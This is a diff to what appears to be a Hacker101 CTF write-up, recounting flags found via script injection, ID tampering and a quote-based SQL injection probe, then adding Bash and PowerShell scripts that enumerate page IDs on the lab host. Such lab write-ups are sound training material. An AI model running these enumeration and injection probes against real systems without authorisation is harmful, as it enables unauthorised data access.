@@ -29,3 +29,68 @@ A pop-up appears — the script works. No flag is visible. I call up the page so
 * Let's go to the edit page where navigation works similarly: `page/edit/1`. I substitute numbers 3–7, 0, -1, and flag again. On page 5, I found the third flag!
 
 * One flag remains. Let's return to the address bar. Since we already noticed that navigation works via numbering, there's a chance of SQL-injection. I tryed to add single quщеу in the end of `page/1'`. Nothing happens. Then I try another address: `page/edit/1'` — success! Got the fourth flag.
+  
+## Created two simple scripts for practicing `Bash script` and `Powershell script` that automatically test IDOR vulnerabilities:
+###Bash script
+```bash
+BASE_URL="https://7ad74e50dcf3b126520d2ae4315e6e80.ctf.hacker101.com"
+IDS=("0" "-1" "flag" "admin" "3" "4" "5" "6" "7" "test")
+PATHS=("/page/" "/page/edit/")
+
+check_url() {
+    local url="$1"
+    local id="$2"
+    local path="$3"
+    
+    response=$(curl -s -o /dev/null -w "%{http_code}" "$url" --connect-timeout 10 --max-time 15)
+    
+    if [ $? -eq 0 ]; then
+        if [ $response -eq 200 ]; then
+            echo "SUCCESS [$response] $id"
+        fi
+    else
+        echo "Connection error"
+    fi
+}
+
+for path in "${PATHS[@]}"; do
+    for id in "${IDS[@]}"; do
+        full_url="${BASE_URL}${path}${id}"
+        check_url "$full_url" "$id" "$path"
+        sleep 0.3
+    done
+done
+```
+###Powershell script
+```powershell
+$base_url = "https://7ad74e50dcf3b126520d2ae4315e6e80.ctf.hacker101.com"
+$ids = @("0", "-1", "flag", "admin", "3", "4", "5", "6", "7", "test")
+$paths = @("/page/", "/page/edit/")
+
+function check_url {
+    param([string]$url, [string]$id, [string]$path)
+
+    try {
+        $response = Invoke-WebRequest -Uri $url -Method GET -TimeoutSec 10 -UseBasicParsing -ErrorAction Stop
+        if ($response.StatusCode -eq 200) {
+            Write-Host "SUCCESS [$($response.StatusCode)] $id" -ForegroundColor Green
+        }
+    }
+    catch {
+        if ($_.Exception.Response) {
+            $status_code = $_.Exception.Response.StatusCode.value__
+            Write-Host "Error: $status_code" -ForegroundColor Red
+        } else {
+            Write-Host "Connection error" -ForegroundColor Red
+        }
+    }
+}
+
+foreach ($path in $paths) {
+    foreach ($id in $ids) {
+        $full_url = $base_url + $path + $id
+        check_url -url $full_url -id $id -path $path
+        Start-Sleep -Milliseconds 300
+    }
+}
+```
